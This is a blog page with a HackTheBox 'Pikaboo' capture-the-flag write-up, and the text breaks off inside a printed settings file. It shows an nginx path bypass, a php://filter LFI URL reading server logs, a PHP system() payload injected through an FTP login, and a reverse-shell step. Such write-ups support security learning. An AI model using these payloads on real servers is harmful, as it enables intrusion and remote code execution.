<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox Pikaboo" /><meta property="og:locale" content="en" /><meta name="description" content="Machine Information" /><meta property="og:description" content="Machine Information" /><link rel="canonical" href="https://am-root.github.io/posts/HTB-Pikaboo/" /><meta property="og:url" content="https://am-root.github.io/posts/HTB-Pikaboo/" /><meta property="og:site_name" content="amroot" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-14T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox Pikaboo" /><meta name="twitter:site" content="@_amroot" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"mainEntityOfPage":{"@type":"WebPage","@id":"https://am-root.github.io/posts/HTB-Pikaboo/"},"description":"Machine Information","url":"https://am-root.github.io/posts/HTB-Pikaboo/","@type":"BlogPosting","headline":"HackTheBox Pikaboo","dateModified":"2021-12-14T00:00:00+00:00","datePublished":"2021-12-14T00:00:00+00:00","@context":"https://schema.org"}</script><title>HackTheBox Pikaboo | amroot</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="amroot"><meta name="application-name" content="amroot"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/hacker.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">amroot</a></div><div class="site-subtitle font-italic">CTF writeups and Infosec blogs</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/am-root" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/_amroot" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['janakskhairmode','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/amroot" aria-label="linkedin" class="order-6" > <i class="fab fa-linkedin"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox Pikaboo</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox Pikaboo</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Janak Khairmode </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Dec 14, 2021, 12:00 AM +0000" >Dec 14, 2021<i class="unloaded">2021-12-14T00:00:00+00:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2251 words">12 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-proofer-ignore data-src="/image/hackthebox/pikaboo/pikabooinfocard.png" class="preview-img" alt="pikabooinfocard" width="1000" height="400"><h1 id="machine-information">Machine Information</h1><p>Pikaboo is extremely fun box to solve. The box starts with enumeration on web server that is hosting nginx but later finding that Apache is running as well. Apache server can be bypassed to find the admin page, which is explained in OrangeTsai’s Blackhat talk. After enumerating on the Apache I get to find LFI vulnerability where I can read FTP log file. FTP log file can be poisoned by logging in with PHP code. That’s how I am able to get <code class="language-plaintext highlighter-rouge">www-data</code> user, after getting in the box, there is a crontab running every minute which is executing a bin file. While enumerating more on the machine, I found LDAP and FTP credentials for <code class="language-plaintext highlighter-rouge">pwnmeow</code> user. Later I ran across one perl command execution vulneability which I will use to get to root.</p><h1 id="enumeration">Enumeration</h1><h2 id="nmap">nmap</h2><p>I have started <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports with version of the running services and running common scripts against them, using <code class="language-plaintext highlighter-rouge">-sV</code> and <code class="language-plaintext highlighter-rouge">-sC</code> flags respectively. <code class="language-plaintext highlighter-rouge">nmap</code> gave me the following results,</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>Nmap scan report <span class="k">for </span>10.10.10.249
Host is up <span class="o">(</span>0.20s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f <span class="o">(</span>RSA<span class="o">)</span>
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.14.2
|_http-title: Pikaboo
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>73.96 seconds
</pre></table></code></div></div><p>All of these versions did not have any exploits listed in <code class="language-plaintext highlighter-rouge">searchsploit</code>. I will start <code class="language-plaintext highlighter-rouge">ffuf</code> in the background while I visit port 80.</p><h2 id="website">Website</h2><p>This is the front page of the website. The webiste is about catching the pokatmon.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/01.png" alt="01" style="zoom:67%;" /></p><p>There are a lot of pokamon listed in <code class="language-plaintext highlighter-rouge">Pokatdex</code> page but clicking on them says PokeAPI is yet to be integrated.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/02.png" alt="02" style="zoom:80%;" /></p><p>There is nothing on the <code class="language-plaintext highlighter-rouge">Contact</code> page as well but the <code class="language-plaintext highlighter-rouge">Admin</code> page is asking for credentials.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/03.png" alt="03" style="zoom:80%;" /></p><p>Clicking on <code class="language-plaintext highlighter-rouge">Cancel</code> revealed Apache Server running on Port 81, So the thing is <code class="language-plaintext highlighter-rouge">nginx</code> might be running as reverse proxy directing all the traffic from Apache Server to port 80.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/04.png" alt="04" style="zoom:80%;" /></p><h2 id="off-by-slash">Off-by-slash</h2><p>This misconfiguration in nginx is very subtle, it was founded by <a href="https://twitter.com/orange_8361">OrangeTsai</a>. In his <em>Breaking parser logic</em> blackhat session explained the Off-By-Slash vulnerability in nginx.</p><blockquote><p>Video: https://www.youtube.com/watch?v=CIhHpkybYsY</p><p>Whitepaper: https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</p></blockquote><p>The Vulnerabilty goes like:</p><blockquote><p>If in a nginx web configuration file some location is like “location /temp {..}” then it leads to LFI. Developer might think that it will only list files inside <code class="language-plaintext highlighter-rouge">/temp</code> directory but it actually be abused by <code class="language-plaintext highlighter-rouge">/temp../somefile</code>.</p></blockquote><p>I can now bypass the login prompt and visit <code class="language-plaintext highlighter-rouge">admin../server-status</code></p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/05.png" alt="05" style="zoom:67%;" /></p><p>I then tried visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.243/admin../admin_staging/</code>.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/06.png" alt="06" style="zoom:67%;" /></p><h1 id="getting-www-data-shell">Getting www-data shell</h1><h2 id="lfi-vulnerability">LFI vulnerability</h2><p>Now that I got the admin dashboard I ran <code class="language-plaintext highlighter-rouge">gobuster</code> against it and it found interesting files.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/08.png" alt="08" style="zoom: 50%;" /></p><p>I tried accessing <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file but was getting error and URI is getting resolved to <code class="language-plaintext highlighter-rouge">http://10.10.10.249/etc/passwd</code>. I will just visit <code class="language-plaintext highlighter-rouge">info.php</code> file, I also check other files but they did not have any useful information.</p><p><code class="language-plaintext highlighter-rouge">info.php</code> file shows why I am unable to access or read <code class="language-plaintext highlighter-rouge">/etc/passwd</code> or any other folder.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/07.png" alt="07" style="zoom:150%;" /></p><p><code class="language-plaintext highlighter-rouge">open_basedir</code> is used to protect files outside mentioned folder. PHP will read files from the given folder and restrict any other files.</p><ul><li>Official PHP documentation: https://www.php.net/manual/en/ini.core.php#ini.open-basedir<li>What is <code class="language-plaintext highlighter-rouge">open_basedir</code> ? : https://xneelo.co.za/help-centre/website/open_basedir-error/</ul><p>The left navigation bar is has a URL structure like <code class="language-plaintext highlighter-rouge">10.10.10.249/admin../admin_staging/index.php?page=info.php</code>, So it might lead to file inclusion vulnerablity. Since it is a php file I used PHP base64 filter and successfully exfiltrated the php files and inspected them. Out of them index.php had an interesting code and why I was able to get files. It is using <code class="language-plaintext highlighter-rouge">include()</code> function and that is the reason for LFI vulnerability. What include() function does, a developer can include the content of one PHP file into another PHP file using <code class="language-plaintext highlighter-rouge">include()</code> function.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/13.png" alt="13" style="zoom:80%;" /></p><h2 id="ftp-log-poisoning">FTP log poisoning</h2><p>So now I might be able to see other files than this folder but again <code class="language-plaintext highlighter-rouge">open_basedir</code> is blocking the requests. I ran gobuster again but now using SecList’s LFI file and it returned some files but out of them FTP is interesting.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/09.png" alt="09" style="zoom: 50%;" /></p><p>I was able to see the file but there is a possiblity that I might miss some characters so I used PHP’s base64 filter. The url becomes <code class="language-plaintext highlighter-rouge">http://10.10.10.249/admin../admin_staging/index.php?page=php://filter/convert.base64-encode/resource=/var/log/vsftpd.log</code></p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/10.png" alt="10" style="zoom:80%;" /></p><p>This file did not have any credentials in it. I googled for “<a href="https://secnhack.in/ftp-log-poisoning-through-lfi/">FTP log LFI</a>” and it lead me an interesting log poisoning way to get an reverse shell.</p><p>First I login to FTP server using <code class="language-plaintext highlighter-rouge">&lt;?php system("id")?&gt;</code> and use <code class="language-plaintext highlighter-rouge">password</code> for password. In the logs I can see <code class="language-plaintext highlighter-rouge">www-data</code> username printed.</p><ol><li><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/11.png" alt="11" style="zoom:80%;" /></p><li><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/12.png" alt="12" style="zoom: 50%;" /></p></ol><p>I used normal bash reverse shell. Entered the payload into FTP user and for password it doesn’t really matter as I just have to poison the log file.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/14.png" alt="14" style="zoom:67%;" /></p><p>After doing that I reloaded the webpage and on my <code class="language-plaintext highlighter-rouge">nc</code> listener I got the reverse shell.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/15.png" alt="15" style="zoom:67%;" /></p><h1 id="getting-root-shell">Getting root shell</h1><p>I was able to read the <code class="language-plaintext highlighter-rouge">user.txt</code> file inside pwnmeow user. So I went on searching for any way that could give me the user or way to get the root.</p><p>While enumerating inside the apache2 folder I found the admin password, I will save this just in case.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/18.png" alt="18" style="zoom:67%;" /></p><h2 id="finding-crontab">finding crontab</h2><p>Now there is a crontab running every minute as root user.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/16.png" alt="16" style="zoom:67%;" /></p><p>Inside the contents of <code class="language-plaintext highlighter-rouge">/usr/local/bin/csvupdate_cron</code></p><blockquote><p>#!/bin/bash\</p><p>for d in /srv/ftp/*<br /> do<br /> cd $d<br /> /usr/local/bin/csvupdate $(basename $d) *csv<br /> /usr/bin/rm -rf *<br /> done</p></blockquote><p>So the file is doing for loop for every directories inside <code class="language-plaintext highlighter-rouge">/srv/ftp/</code> directory and moving inside them and executing <code class="language-plaintext highlighter-rouge">/usr/local/bin/csvupdate</code> on them creating <code class="language-plaintext highlighter-rouge">*.csv</code> files and lastly removing all the files.</p><p>Looking at the <code class="language-plaintext highlighter-rouge">/usr/local/bin/csvupdate</code> file,</p><div class="language-perl highlighter-rouge"><div class="code-header"> <span text-data=" Perl "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/perl</span>

<span class="c1">##################################################################</span>
<span class="c1"># Script for upgrading PokeAPI CSV files with FTP-uploaded data. #</span>
<span class="c1">#                                                                #</span>
<span class="c1"># Usage:                                                         #</span>
<span class="c1"># ./csvupdate &lt;type&gt; &lt;file(s)&gt;                                   #</span>
<span class="c1">#                                                                #</span>
<span class="c1"># Arguments:                                                     #</span>
<span class="c1"># - type: PokeAPI CSV file type                                  #</span>
<span class="c1">#         (must have the correct number of fields)               #</span>
<span class="c1"># - file(s): list of files containing CSV data                   #</span>
<span class="c1">##################################################################</span>

<span class="k">use</span> <span class="nv">strict</span><span class="p">;</span>
<span class="k">use</span> <span class="nv">warnings</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">Text::</span><span class="nv">CSV</span><span class="p">;</span>

<span class="k">my</span> <span class="nv">$csv_dir</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/opt/pokeapi/data/v2/csv</span><span class="p">";</span>

<span class="k">my</span> <span class="nv">%csv_fields</span> <span class="o">=</span> <span class="p">(</span>
  <span class="p">'</span><span class="s1">abilities</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
  <span class="p">'</span><span class="s1">ability_changelog</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
  <span class="p">'</span><span class="s1">ability_changelog_prose</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
  <span class="p">'</span><span class="s1">ability_flavor_text</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
  <span class="p">'</span><span class="s1">ability_names</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
	<span class="o">....</span><span class="p">[</span><span class="nv">snip</span><span class="p">]</span><span class="o">....</span>
  <span class="p">'</span><span class="s1">type_names</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
  <span class="p">'</span><span class="s1">types</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
  <span class="p">'</span><span class="s1">version_group_pokemon_move_methods</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
  <span class="p">'</span><span class="s1">version_group_regions</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
  <span class="p">'</span><span class="s1">version_groups</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
  <span class="p">'</span><span class="s1">version_names</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
  <span class="p">'</span><span class="s1">versions</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">3</span>
<span class="p">);</span>


<span class="k">if</span><span class="p">(</span><span class="nv">$#ARGV</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="nb">die</span> <span class="p">"</span><span class="s2">Usage: $0 &lt;type&gt; &lt;file(s)&gt;</span><span class="se">\n</span><span class="p">";</span>
<span class="p">}</span>

<span class="k">my</span> <span class="nv">$type</span> <span class="o">=</span> <span class="nv">$ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">exists</span> <span class="nv">$csv_fields</span><span class="p">{</span><span class="nv">$type</span><span class="p">})</span>
<span class="p">{</span>
  <span class="nb">die</span> <span class="p">"</span><span class="s2">Unrecognised CSV data type: </span><span class="si">$type</span><span class="s2">.</span><span class="se">\n</span><span class="p">";</span>
<span class="p">}</span>

<span class="k">my</span> <span class="nv">$csv</span> <span class="o">=</span> <span class="nn">Text::</span><span class="nv">CSV</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">({</span> <span class="s">sep_char</span> <span class="o">=&gt;</span> <span class="p">'</span><span class="s1">,</span><span class="p">'</span> <span class="p">});</span>

<span class="k">my</span> <span class="nv">$fname</span> <span class="o">=</span> <span class="p">"</span><span class="si">${csv_dir}</span><span class="s2">/</span><span class="si">${type}</span><span class="s2">.csv</span><span class="p">";</span>
<span class="nb">open</span><span class="p">(</span><span class="k">my</span> <span class="nv">$fh</span><span class="p">,</span> <span class="p">"</span><span class="s2">&gt;&gt;</span><span class="p">",</span> <span class="nv">$fname</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">die</span> <span class="p">"</span><span class="s2">Unable to open CSV target file.</span><span class="se">\n</span><span class="p">";</span>

<span class="nb">shift</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="o">&lt;&gt;</span><span class="p">)</span>
<span class="p">{</span>
  <span class="nb">chomp</span><span class="p">;</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$csv</span><span class="o">-&gt;</span><span class="nv">parse</span><span class="p">(</span><span class="vg">$_</span><span class="p">))</span>
  <span class="p">{</span>
    <span class="k">my</span> <span class="nv">@fields</span> <span class="o">=</span> <span class="nv">$csv</span><span class="o">-&gt;</span><span class="nv">fields</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">@fields</span> <span class="o">!=</span> <span class="nv">$csv_fields</span><span class="p">{</span><span class="nv">$type</span><span class="p">})</span>
    <span class="p">{</span>
      <span class="nb">warn</span> <span class="p">"</span><span class="s2">Incorrect number of fields: '</span><span class="si">$_</span><span class="s2">'</span><span class="se">\n</span><span class="p">";</span>
      <span class="k">next</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">print</span> <span class="nv">$fh</span> <span class="p">"</span><span class="si">$_</span><span class="se">\n</span><span class="p">";</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nb">close</span><span class="p">(</span><span class="nv">$fh</span><span class="p">);</span>

</pre></table></code></div></div><p>In this file if block is checking the number of command-line arguments if the arguments are less than 1 then it throws Usage error. Then it checks if the CSV fields are inside the <code class="language-plaintext highlighter-rouge">csv_fields</code> and throws error if it doesn’t. Each of the folder in <code class="language-plaintext highlighter-rouge">/srv/ftp</code> is opened by checking with the parameters inside this directory if it matches then it opens an output <code class="language-plaintext highlighter-rouge">.csv</code> file with handle <code class="language-plaintext highlighter-rouge">$fh</code>.</p><p><code class="language-plaintext highlighter-rouge">shift</code> (remove and return) the first value from <code class="language-plaintext highlighter-rouge">@ARGV</code>, the argument list of your program. so the <code class="language-plaintext highlighter-rouge">.csv</code> files are cause by this.</p><p><code class="language-plaintext highlighter-rouge">for(&lt;&gt;)</code> is opening each files and looping them into variable <code class="language-plaintext highlighter-rouge">$_</code> now <code class="language-plaintext highlighter-rouge">chomp</code> is removing white trailing from each line.</p><h2 id="pokeapi">pokeapi</h2><p>The file mentioned usage of <code class="language-plaintext highlighter-rouge">my $csv_dir = "/opt/pokeapi/data/v2/csv";</code>. Inside the <code class="language-plaintext highlighter-rouge">/opt/pokeapi</code> directory, there is a <code class="language-plaintext highlighter-rouge">config/settings.py</code> file, that file has a lot of interesting information such as credentials for LDAP.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
</pre><td class="rouge-code"><pre><span class="c1"># Production settings
</span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">unipath</span> <span class="kn">import</span> <span class="n">Path</span>

<span class="n">PROJECT_ROOT</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="n">__file__</span><span class="p">).</span><span class="n">ancestor</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>

<span class="n">TEMPLATE_DEBUG</span> <span class="o">=</span> <span class="n">DEBUG</span>

<span class="n">ADMINS</span> <span class="o">=</span> <span class="p">((</span><span class="s">"Paul Hallett"</span><span class="p">,</span> <span class="s">"paulandrewhallett@gmail.com"</span><span class="p">),)</span>

<span class="n">EMAIL_BACKEND</span> <span class="o">=</span> <span class="s">"django.core.mail.backends.console.EmailBackend"</span>

<span class="n">MANAGERS</span> <span class="o">=</span> <span class="n">ADMINS</span>

<span class="n">BASE_URL</span> <span class="o">=</span> <span class="s">"http://pokeapi.co"</span>

<span class="c1"># Hosts/domain names that are valid for this site; required if DEBUG is False
# See https://docs.djangoproject.com/en/1.5/ref/settings/#allowed-hosts
#ALLOWED_HOSTS = [".pokeapi.co", "localhost", "127.0.0.1"]
</span><span class="n">ALLOWED_HOSTS</span> <span class="o">=</span> <span class="p">[</span><span class="s">"*"</span><span class="p">]</span>

<span class="n">TIME_ZONE</span> <span class="o">=</span> <span class="s">"Europe/London"</span>

<span class="n">LANGUAGE_CODE</span> <span class="o">=</span> <span class="s">"en-gb"</span>

<span class="n">SITE_ID</span> <span class="o">=</span> <span class="mi">1</span>

<span class="c1"># If you set this to False, Django will make some optimizations so as not
# to load the internationalization machinery.
</span><span class="n">USE_I18N</span> <span class="o">=</span> <span class="bp">True</span>

<span class="c1"># If you set this to False, Django will not format dates, numbers and
# calendars according to the current locale.
</span><span class="n">USE_L10N</span> <span class="o">=</span> <span class="bp">True</span>

<span class="c1"># If you set this to False, Django will not use timezone-aware datetimes.
</span><span class="n">USE_TZ</span> <span class="o">=</span> <span class="bp">True</span>

<span class="c1"># Explicitly define test runner to avoid warning messages on test execution
</span><span class="n">TEST_RUNNER</span> <span class="o">=</span> <span class="s">"django.test.runner.DiscoverRunner"</span>

<span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="s">"4nksdock439320df*(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&amp;2l#"</span>

